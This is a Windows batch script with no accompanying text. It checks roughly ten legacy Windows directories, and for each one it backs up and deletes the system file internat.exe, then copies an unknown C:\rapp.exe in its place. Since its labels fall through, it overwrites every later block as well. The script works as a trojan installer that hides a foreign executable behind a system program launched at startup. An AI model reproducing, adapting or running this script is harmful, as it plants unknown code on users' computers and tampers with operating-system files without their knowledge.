@if exist C:\windows\win.com goto Windows
@if exist C:\win95\win.com goto Win95
@if exist C:\win98\win.com goto Win98
@if exist C:\win2000\win.com goto Win2000
@if exist C:\winme\win.com goto WinMe
@if exist C:\winnt\win.com goto WinNT
@if exist C:\win_95\win.com goto Win_95
@if exist C:\win_98\win.com goto Win_98
@if exist C:\win_2000\win.com goto Win_2000
@if exist C:\win_me\win.com goto Win_Me
@if exist C:\win_nt\win.com goto Win_NT
goto End

:Windows
@copy C:\windows\internat.exe C:\windows\internat.bak
@del C:\windows\internat.exe
@copy C:\rapp.exe c:\windows\internat.exe

:Win95
@copy C:\win95\internat.exe C:\win95\internat.bak
@del C:\win95\internat.exe
@copy C:\rapp.exe C:\win95\internat.exe
:Win98
@copy C:\win98\internat.exe C:\win98\internat.bak
@del C:\win98\internat.exe
@copy C:\rapp.exe C:\win98\internat.exe
:Win2000
@copy C:\win2000\internat.exe C:\win2000\internat.bak
@del C:\win2000\internat.exe
@copy C:\rapp.exe C:\win2000\internat.exe
:WinMe
@copy C:\winme\internat.exe C:\winme\internat.bak
@del C:\winme\internat.exe
@copy C:\rapp.exe C:\winme\internat.exe
:WinNT
@copy C:\winnt\internat.exe C:\winnt\internat.bak
@del C:\winnt\internat.exe
@copy C:\rapp.exe C:\winnt\internat.exe
:Win_95
@copy C:\win_95\internat.exe C:\win_95\internat.bak
@del C:\win_95\internat.exe
@copy C:\rapp.exe C:\win_95\internat.exe
:Win_98
@copy C:\win_98\internat.exe C:\win_98\internat.bak
@del C:\win_98\internat.exe
@copy C:\rapp.exe C:\win_98\internat.exe
:Win_2000
@copy C:\win_2000\internat.exe C:\win_2000\internat.bak
@del C:\win_2000\internat.exe
@copy C:\rapp.exe C:\win_2000\internat.exe
:Win_Me
@copy C:\win_me\internat.exe C:\win_me\internat.bak
@del C:\win_me\internat.exe
@copy C:\rapp.exe C:\win_me\internat.exe
:Win_NT
@copy C:\win_nt\internat.exe C:\win_nt\internat.bak
@del C:\win_nt\internat.exe
@copy C:\rapp.exe C:\win_nt\internat.exe
:End
